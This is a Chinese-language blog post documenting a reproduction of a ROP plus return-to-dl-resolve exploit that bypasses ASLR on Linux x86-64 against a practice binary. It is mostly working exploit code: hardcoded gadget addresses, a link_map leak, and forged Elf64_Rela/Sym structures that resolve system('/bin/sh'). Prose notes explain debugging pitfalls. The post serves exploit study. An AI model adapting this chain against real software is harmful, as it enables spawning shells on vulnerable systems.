---
layout: post
title: 系统中使用ROP+Return-to-dl实现ASLR
description: "学习复现Return-to-dl的记录"
category: scanner
tags: [exp, aslr, rop]
imagefeature: http://7xwdx7.com1.z0.glb.clouddn.com/5551e1cabd3bb.jpg
comments: true
share: true
---


# 在linux x86-64 系统中使用ROP+Return-to-dl实现ASLR bypass

### 背景

在学习复现ROP+Return-to-dl漏洞利用的过程中，踩了几个坑。将一些技术点记录下来，避免以后再次进坑。

### Return-to-dl利用方式

Return-to-dl是一种用来绕过ASLR的有效方式。这种方式不需要获取glibc并计算偏移地址，因此在一些无法本地调试的远程利用中非常好用。

此前，已经有很多人对该利用方式进行了解释[^1]。这里，我们根据这篇paper[^2]做实际复现。

<!--more-->

[^1]: <http://skysider.com/?p=416>

[^2]: <http://www.freebuf.com/articles/system/149364.html>

### 利用代码原理解释

这里，我们跳过前期的基础知识讲解，直接分析这篇paper中的利用代码。

* 各类ELF格式基础地址信息配置

{% highlight python %}

offset = 120

addr_write_got = 0x000000601018
addr_read_got = 0x000000601020
addr_bss = 0x0000000000601040
addr_relplt = 0x4003a0
addr_got = 0x0000000000601000
addr_plt = 0x400420
addr_write_plt = 0x400430
addr_read_plt = 0x400440
addr_dynsym = 0x00000000004002b8
addr_dynstr = 0x0000000000400330

addr_pop_rbp = 0x00000000004004d0
addr_pop_rdi = 0x0000000000400571
addr_pop_rdx = 0x0000000000400579
addr_pop_rsi = 0x0000000000400573
addr_leave_ret = 0x00000000004005c8

stack_size = 0x800
base_stage = addr_bss + stack_size


{% endhighlight %}

通过readelf、ROPgadegt、GDB等工具，获取ELF各类段地址、GOT、PLT地址、ROP代码地址，并配置到代码中。这里的offset指的是填充buffer的长度，可以通过peda、ROPutil等工具获取。base_stage为构造堆栈数据的写入地址。

* 第一阶段ROP代码

{% highlight python %}

buf1 = "A" * offset
buf1 += p64(addr_pop_rdi)
buf1 += p64(1)
buf1 += p64(addr_pop_rsi)
buf1 += p64(addr_got + 8)
buf1 += p64(addr_pop_rdx)
buf1 += p64(8)
buf1 += p64(addr_write_plt)
buf1 += p64(addr_pop_rdi)
buf1 += p64(0)
buf1 += p64(addr_pop_rsi)
buf1 += p64(base_stage)
buf1 += p64(addr_pop_rdx)
buf1 += p64(200)
buf1 += p64(addr_read_plt)
buf1 += p64(addr_pop_rbp)
buf1 += p64(base_stage)
buf1 += p64(addr_leave_ret)

p = process("./bof")

p.send(p64(len(buf1)))
p.send(buf1)
print "[+] read: %r" % p.recv(len(buf1))
addr_link_map = u64(p.recv(8))
print "[+] addr_link_map = %s" % hex(addr_link_map)

{% endhighlight %}

这段ROP的意图如下，第一步输出GOT表地址+8的数值，也就是link_map的起始地址。打印这个地址的目的在于，我们需要更改link_map+0x1c8处的值为0，以便于构造fake Elf64_Sym。
随后，读取长度为200的用户输入，并存储到base_stage地址。最后将rbp设置为base_stage地址，并执行return过程。在完成该过程后，栈顶指针rsp将指向base_stage地址+8处。

* 第二阶段ROP代码构造准备

{% highlight python %}

addr_reloc = base_stage + 112
reloc_offset = (addr_reloc - addr_relplt) / 0x18
reloc_offset = reloc_offset - 1
r_offset = addr_write_got
r_addend = 0
addr_sym = addr_reloc + 24
padding_dynsym = 0x18 - ((addr_sym-addr_dynsym) % 0x18)
addr_sym += padding_dynsym

addr_symstr = addr_sym + 24

r_info = (((addr_sym - addr_dynsym) / 0x18) << 0x20) | 0x7
cmd = "/bin/sh"
addr_cmd = addr_symstr + 7
st_name = addr_symstr - addr_dynstr

{% endhighlight %}

这里是遇到大坑的一个地方，细心观察这段代码，可以发现和原文中的代码存在区别。这是因为在构造fake Elf64_Sym时，代码考虑了padding补齐。但是在构造fake Elf64_Rela时，代码硬编码了偏移值120。

由于不同的系统bss段、relplt段都存在区别，因此在计算reloc_offset时，不一定能够被0x18整除，造成不能获取正确的fake Elf64_Rela。这里需要和后面构造fake Elf64_Sym一样，进行padding补齐。由于进入了gdb进行调试，因此这里就直接硬编码适合自己的偏移值112了。

当无法获取正确的fake Elf64_Rela时，报出的错误为：Assertion 'ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT' failed!
我们可以在gdb中设置断点_dl_fixup+78，观察RCX的值是否为0x7来进行确认。

在完成相关地址变量的计算后，我们可以开始构造第二阶段ROP的代码

* 第二阶段ROP代码解释

{% highlight python %}

buf2 = "A" * 8
buf2 += p64(addr_pop_rdi)
buf2 += p64(0)
buf2 += p64(addr_pop_rsi)
buf2 += p64(addr_link_map + 0x1c8)
buf2 += p64(addr_pop_rdx)
buf2 += p64(8)
buf2 += p64(addr_read_plt)
buf2 += p64(addr_pop_rdi) # system args
buf2 += p64(addr_cmd)
buf2 += p64(addr_plt)
buf2 += p64(reloc_offset)
buf2 += "A" * (120 - len(buf2))
buf2 += p64(r_offset)    # Elf64_Rela
buf2 += p64(r_info)
buf2 += p64(r_addend)
buf2 += "A" * padding_dynsym
buf2 += p32(st_name)     # Elf64_Sym
buf2 += p32(0x00000012)
buf2 += p64(0)
buf2 += p64(0)
buf2 += "system\x00"
buf2 += cmd + "\x00"
buf2 += "A" * (200 - len(buf2))

{% endhighlight %}

第二阶段ROP代码的执行步骤如下，首先更改link_map+0x1c8处的值为0，否则在解析fake Elf64_Sym时会引发一个段错误，导致exp无法正常运行。

随后，将参数"/bin/sh"写到rdi寄存器，并进入dl_resolve阶段。在dl_resolve过程中，通过reloc_offset参数，将解析的数据地址设置到可控的base_stage。并通过构造fake Elf64_Rela和fake Elf64_Sym让dl_resolve过程加载system函数到addr_write_got。此时，寄存器rdi中的参数"/bin/sh"被当做system函数的输入值，完成了getshell的过程。

### 学习心得

Return-to-dl漏洞利用方式需要对ELF格式、ELF动态加载机制有深入的基础知识储备。这样在理解漏洞利用代码时，才能明白每个步骤的目的和原理。这些基础知识也可以参考这篇文章来进行学习[^3]。

<!--more-->

[^3]: <http://pwdme.cc/2017/09/26/lazy-binding-in-detail/>
